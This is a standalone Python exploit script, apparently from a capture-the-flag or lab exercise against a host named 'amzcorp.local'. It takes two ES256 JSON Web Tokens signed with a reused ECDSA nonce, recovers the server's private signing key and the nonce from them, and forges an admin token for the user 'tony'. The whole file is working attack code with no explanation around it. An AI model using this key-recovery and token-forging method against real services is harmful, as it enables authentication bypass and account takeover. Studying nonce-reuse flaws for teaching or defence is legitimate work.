#!/usr/bin/env python3
"""ECDSA nonce reuse → forge tony admin JWT (company-support)."""
import base64
import hashlib
import json
import sys

from ecdsa.ecdsa import Public_key, Private_key, Signature, generator_256


def bytes_to_long(data: bytes) -> int:
    return int.from_bytes(data, "big")


def long_to_bytes(val: int) -> bytes:
    n = val.bit_length() // 8 + 1
    return val.to_bytes(n, "big")

JWT1 = (
    "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6Imp3dHVzZXIxIiwiZW1haWwiOiJqd3R1c2VyMUB0ZXN0LmxvY2FsIiwiYWNjb3VudF9zdGF0dXMiOnRydWV9."
    "Oup5WWMjav5geI-ji3KNPODZxH3rQVDQtP_gaQA4jKQWHGn_VX-o-uwaTW5sW-aDLIxk6tYtupU78wdW8Twqlg"
)
JWT2 = (
    "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6Imp3dHVzZXIyIiwiZW1haWwiOiJqd3R1c2VyMkB0ZXN0LmxvY2FsIiwiYWNjb3VudF9zdGF0dXMiOnRydWV9."
    "Oup5WWMjav5geI-ji3KNPODZxH3rQVDQtP_gaQA4jKTPpZJPGEGtkmnl6W3IkzH67oDpORTMGNKwCvpOxIyC-w"
)


def b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode()


def unb64(data: str) -> bytes:
    pad = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - pad))


def sign(msg: str, privkey, k: int) -> str:
    msghash = hashlib.sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    packed = (sig.r << 256) + sig.s
    return b64(long_to_bytes(packed)).replace("=", "")


def create_jwt(data: dict, privkey, k: int) -> str:
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(",", ":")).encode())
    _data = b64(json.dumps(data, separators=(",", ":")).encode())
    _sig = sign(f"{_header}.{_data}".replace("=", ""), privkey, k)
    return f"{_header}.{_data}.{_sig}".replace("=", "")


def recover_key(jwt_a: str, jwt_b: str):
    head1, data1, sig1 = jwt_a.split(".")
    head2, data2, sig2 = jwt_b.split(".")
    msg1 = f"{head1}.{data1}"
    msg2 = f"{head2}.{data2}"
    h1 = bytes_to_long(hashlib.sha256(msg1.encode()).digest())
    h2 = bytes_to_long(hashlib.sha256(msg2.encode()).digest())
    raw1 = bytes_to_long(unb64(sig1))
    raw2 = bytes_to_long(unb64(sig2))
    s1 = Signature(raw1 >> 256, raw1 % (2**256))
    s2 = Signature(raw2 >> 256, raw2 % (2**256))
    r1, s1v = s1.r, s1.s
    r2, s2v = s2.r, s2.s
    if r1 != r2:
        raise SystemExit(f"nonce reuse failed: r1={r1} r2={r2}")
    G = generator_256
    q = G.order()
    d = (((s2v * h1) - (s1v * h2)) * pow(r1 * (s1v - s2v), -1, q)) % q
    k = ((h1 - h2) * pow(s1v - s2v, -1, q)) % q
    pubkey = Public_key(G, G * d)
    privkey = Private_key(pubkey, d)
    return privkey, k


if __name__ == "__main__":
    j1 = sys.argv[1] if len(sys.argv) > 1 else JWT1
    j2 = sys.argv[2] if len(sys.argv) > 2 else JWT2
    privkey, k = recover_key(j1, j2)
    tony = {"username": "tony", "email": "tony@amzcorp.local", "account_status": True}
    print(create_jwt(tony, privkey, k))
